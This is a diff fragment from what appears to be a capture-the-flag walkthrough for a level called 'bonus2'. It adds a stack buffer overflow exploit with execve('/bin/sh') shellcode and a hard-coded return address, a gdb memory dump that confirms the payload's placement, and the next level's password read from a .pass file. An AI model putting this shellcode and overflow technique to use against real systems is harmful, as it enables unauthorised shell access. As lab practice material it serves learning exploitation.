@@ -105,8 +105,20 @@ SIGSEGV
 cyclic -l 0x61666161 = 18
 ```
 
+```
+run  $(python -c 'print "A" * 19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" ') $(python -c 'print "B" * 18 + "\xbf\xff\xf6\x50"[::-1]')
+
+0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff660:	0x6a414141	0x5299580b	0x732f2f68	0x622f6868
+0xbffff670:	0xe3896e69	0x80cdc931	0x42424242	0x42424242
+0xbffff680:	0x42424242	0x42424242	0xf6604242	0x0000bfff
 
 
+/home/user/bonus2/bonus2  $(python -c 'print "A" * 19 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" ') $(python -c 'print "B" * 18 + "\xbf\xff\xf6\x50"[::-1]')
+
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
 
 
 
